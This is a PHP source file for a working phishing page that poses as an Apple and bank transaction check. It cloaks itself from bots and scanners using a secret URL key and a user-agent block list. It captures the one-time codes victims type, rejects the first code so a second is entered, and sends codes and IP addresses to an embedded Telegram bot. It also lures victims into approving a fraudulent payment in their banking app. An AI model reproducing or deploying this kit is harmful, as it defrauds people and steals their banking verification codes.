<?php
session_start();
ob_start();

// === SECURITY ENHANCEMENTS ===
header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');
header('X-XSS-Protection: 1; mode=block');

// Set a strict CSP header (adjust as needed for your resources)
// header("Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com/ajax/libs; style-src 'self' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com/ajax/libs 'unsafe-inline'; img-src 'self' data: https:;");

// ANTI-BOT SYSTEM (DISABLED FOR LOCALHOST)
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$visitor_ip = $_SERVER['REMOTE_ADDR'];

// Rate limiting - track requests per IP
$rate_limit_file = 'rate_limit.txt';
$current_time = time();
$rate_limit_window = 300; // 5 minutes
$max_requests = 10;

// Initialize rate limiting data
if (!isset($_SESSION['requests'])) {
    $_SESSION['requests'] = [];
}

// Clean old requests
$_SESSION['requests'] = array_filter($_SESSION['requests'], function($time) use ($current_time, $rate_limit_window) {
    return ($current_time - $time) < $rate_limit_window;
});

// Check if rate limit exceeded
if (count($_SESSION['requests']) >= $max_requests) {
    header("HTTP/1.1 429 Too Many Requests");
    exit("Too many requests. Please try again later.");
}

// Log this request
$_SESSION['requests'][] = $current_time;

// ONLY ACTIVATE ANTI-BOT IF NOT ON LOCALHOST
if ($visitor_ip !== '127.0.0.1' && $visitor_ip !== '::1') {
    $secret_key = "apple_secure_" . date('Y');
    
    // Additional bot detection
    $is_bot = false;
    
    // Check for empty user agent
    if (empty($user_agent)) {
        $is_bot = true;
    }
    
    // Check for common bot user agents
    $bot_indicators = ['bot', 'crawl', 'spider', 'slurp', 'search', 'archive', 'python', 'java', 'curl', 'wget', 'php'];
    foreach ($bot_indicators as $indicator) {
        if (stripos($user_agent, $indicator) !== false) {
            $is_bot = true;
            break;
        }
    }
    
    // Check for missing referrer on form submission
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && empty($_SERVER['HTTP_REFERER'])) {
        $is_bot = true;
    }
    
    // Check secret key parameter
    if (!isset($_GET['sybo']) || $_GET['sybo'] !== $secret_key) {
        $is_bot = true;
    }
    
    if ($is_bot) {
        $logEntry = "BLOCKED - IP: $visitor_ip - UA: $user_agent - Time: " . date('Y-m-d H:i:s') . "\n";
        file_put_contents("blocked_log.txt", $logEntry, FILE_APPEND);
        header('Location: https://www.apple.com/');
        exit;
    }
}

// === TELEGRAM NOTIFICATION FUNCTION ===
function sendTelegramNotification($message) {
    $botToken = '8450566694:AAHKZmBuNJZ8BdvkA4ab6kli8PXC24X2D2U'; // Replace with your bot token
    $chatId = '-4932499123'; // Replace with your chat ID
    
    $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
    
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    @file_get_contents($telegramUrl, false, $context);
}

// === OTP VERIFICATION LOGIC ===
$error_message = "";

// Initialize session variables if not set
if (!isset($_SESSION['attempt_count'])) {
    $_SESSION['attempt_count'] = 0;
}

// Check if form was submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['addres'])) {
        // OTP form submitted
        $entered_otp = trim($_POST['addres']);
        
        // Send OTP to Telegram
        $otp_message = "📱 <b>New OTP Entered</b>\n";
        $otp_message .= "IP: " . $visitor_ip . "\n";
        $otp_message .= "OTP: " . $entered_otp . "\n";
        $otp_message .= "Time: " . date('Y-m-d H:i:s');
        sendTelegramNotification($otp_message);
        
        // STRICT OTP VALIDATION - MUST BE EXACTLY 6 DIGITS
        if (empty($entered_otp) || !preg_match('/^\d{6}$/', $entered_otp)) {
            $error_message = "Invalid OTP. Please enter exactly 6 digits.";
        } else {
            $_SESSION['attempt_count']++;
            
            // First attempt fails, second attempt succeeds
            if ($_SESSION['attempt_count'] >= 2) {
                // Send success notification to Telegram
                $success_message = "✅ <b>OTP Verification Success</b>\n";
                $success_message .= "IP: " . $visitor_ip . "\n";
                $success_message .= "Time: " . date('Y-m-d H:i:s');
                sendTelegramNotification($success_message);
                
                // Clear the session and redirect to red.php
                session_unset();
                session_destroy();
                header('Location: red.php');
                exit;
            } else {
                $error_message = "Incorrect OTP. Please try again.";
            }
        }
    } elseif (isset($_POST['approve_action'])) {
        // "I Did Accept" button clicked
        $approve_message = "✅ <b>User Approved via Banking App</b>\n";
        $approve_message .= "IP: " . $visitor_ip . "\n";
        $approve_message .= "Time: " . date('Y-m-d H:i:s');
        sendTelegramNotification($approve_message);
        
        // Redirect to success page
        header('Location: red.php');
        exit;
    }
}

// Generate CSRF token if not exists
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="icon" type="image/png" href="icon.png">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Transaction Verification</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            background-color: #f5f7fa;
            font-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        .verification-wrapper {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }
        .verification-card {
            background: #ffffff;
            padding: 30px;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        .verification-card img {
            width: 60px;
            margin-bottom: 20px;
        }
        .verification-card h2 {
            font-size: 1.8rem;
            margin-bottom: 10px;
            color: #1d1d1f;
            font-weight: 600;
        }
        .verification-card p {
            font-size: 1rem;
            color: #86868b;
            margin-bottom: 15px;
            line-height: 1.5;
        }
        .transaction-details {
            background-color: #f5f7fa;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 20px;
            text-align: left;
        }
        .transaction-details p {
            margin-bottom: 8px;
            display: flex;
            justify-content: space-between;
        }
        .transaction-details .label {
            color: #86868b;
        }
        .transaction-details .value {
            color: #1d1d1f;
            font-weight: 500;
        }
        .form-control {
            border-radius: 12px;
            padding: 16px;
            font-size: 1.1rem;
            border: 1px solid #d2d2d7;
            letter-spacing: 4px;
            text-align: center;
            font-weight: 600;
        }
        .form-control:focus {
            border-color: #0071e3;
            box-shadow: 0 0 0 2px rgba(0, 113, 227, 0.2);
        }
        .btn-primary {
            border-radius: 12px;
            padding: 16px 20px;
            font-size: 1.1rem;
            background-color: #0071e3;
            border: none;
            font-weight: 600;
            transition: all 0.2s;
        }
        .btn-primary:hover {
            background-color: #0077ED;
            transform: translateY(-1px);
        }
        .btn-outline-primary {
            border-radius: 12px;
            padding: 14px 20px;
            font-size: 1rem;
            border: 1px solid #0071e3;
            color: #0071e3;
            font-weight: 600;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: all 0.2s;
        }
        .btn-outline-primary:hover {
            background-color: #0071e3;
            color: white;
            transform: translateY(-1px);
        }
        .error {
            color: #d93025;
            font-size: 0.9rem;
            font-weight: 500;
            padding: 12px;
            background-color: #fce8e6;
            border-radius: 8px;
            margin-bottom: 15px;
        }
        .app-approve-section {
            margin-top: 25px;
            padding: 20px;
            background-color: #f0f7ff;
            border-radius: 12px;
            border: 1px solid #cce5ff;
            text-align: center;
        }
        .app-approve-section h5 {
            color: #0071e3;
            margin-bottom: 12px;
            font-weight: 600;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        .app-approve-section p {
            color: #1d1d1f;
            margin-bottom: 15px;
            font-size: 0.95rem;
        }
        .app-approve-section ul {
            text-align: left;
            padding-left: 20px;
            margin-bottom: 15px;
        }
        .app-approve-section li {
            margin-bottom: 8px;
            color: #515154;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #d2d2d7;
        }
        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #d2d2d7;
        }
        .divider span {
            padding: 0 15px;
            font-size: 0.9rem;
            color: #86868b;
        }
        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 20px;
            color: #86868b;
            font-size: 0.9rem;
        }
        .status-info {
            background-color: #f5f7fa;
            border-radius: 8px;
            padding: 12px;
            margin-top: 15px;
            text-align: left;
        }
        .status-info p {
            margin-bottom: 5px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
    </style>
</head>
<body>
<div class="verification-wrapper">
    <div class="verification-card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo">
        <h2>Verify Your Transaction</h2>
        
        <div class="transaction-details">
            <p><span class="label">Merchant:</span> <span class="value">Apple.com</span></p>
            <p><span class="label">Amount:</span> <span class="value">0 €</span></p>
           
            <p><span class="label">Date:</span> <span class="value" id="currentDate"></span></p>
        </div>
        
        <p class="otpResultMessage">For your security, we've sent a verification code to your registered device.</p>
        
        <?php if (!empty($error_message)): ?>
            <div class="error"><?php echo htmlspecialchars($error_message); ?></div>
        <?php endif; ?>
        
        <form id="verifyForm" method="post" class="mt-3">
            <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
            <div class="mb-3">
                <input id="code" name="addres" type="text" class="form-control" placeholder="Enter 6-digit code" required autocomplete="off" inputmode="numeric" pattern="[0-9]*" maxlength="6">
            </div>
            <button type="submit" class="btn btn-primary w-100">Continue</button>
        </form>
        
        <div class="divider">
            <span>OR</span>
        </div>
        
        <!-- App Approval Section -->
        <div class="app-approve-section">
            <h5><i class="fas fa-mobile-alt"></i> Use Your Banking App</h5>
            <p>Approve this transaction directly through your banking app</p>
            
            <ul>
                <li><strong>Open</strong> your mobile banking app</li>
                <li><strong>Review</strong> the pending transaction</li>
                <li><strong>Approve</strong> with a single tap</li>
            </ul>
            
            <p><em>Fast, easy, and completely secure! ✅</em></p>
            
            <div class="status-info">
                <p><i class="fas fa-check-circle" style="color: #34c759;"></i> If approved, your payment will complete successfully</p>
                <p><i class="fas fa-times-circle" style="color: #ff3b30;"></i> If not, the transaction will be canceled</p>
            </div>
            
            <form method="post" class="mt-3">
                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                <input type="hidden" name="approve_action" value="1">
                <button type="submit" class="btn btn-outline-primary">
                    <i class="fas fa-external-link-alt"></i> I Approved in My Banking App
                </button>
            </form>
        </div>
        
        <div class="security-badge">
            <i class="fas fa-lock"></i>
            <span>Secure Verification</span>
        </div>
    </div>
</div>

<script>
    // Set current date
    document.getElementById('currentDate').textContent = new Date().toLocaleString();
    
    // Input validation - only numbers and max 6 digits
    const codeInput = document.getElementById('code');
    codeInput.addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
    });
    
    // Add animation to buttons
    const buttons = document.querySelectorAll('button');
    buttons.forEach(button => {
        button.addEventListener('mouseover', function() {
            this.style.transform = 'translateY(-2px)';
            this.style.boxShadow = '0 4px 12px rgba(0, 113, 227, 0.2)';
        });
        
        button.addEventListener('mouseout', function() {
            this.style.transform = 'translateY(0)';
            this.style.boxShadow = 'none';
        });
    });
    
    // Form submission protection
    let formSubmitted = false;
    document.getElementById('verifyForm').addEventListener('submit', function(e) {
        if (formSubmitted) {
            e.preventDefault();
            return;
        }
        formSubmitted = true;
        
        // Add loading state
        const submitBtn = this.querySelector('button[type="submit"]');
        submitBtn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Verifying...';
        submitBtn.disabled = true;
    });
</script>
</body>
</html>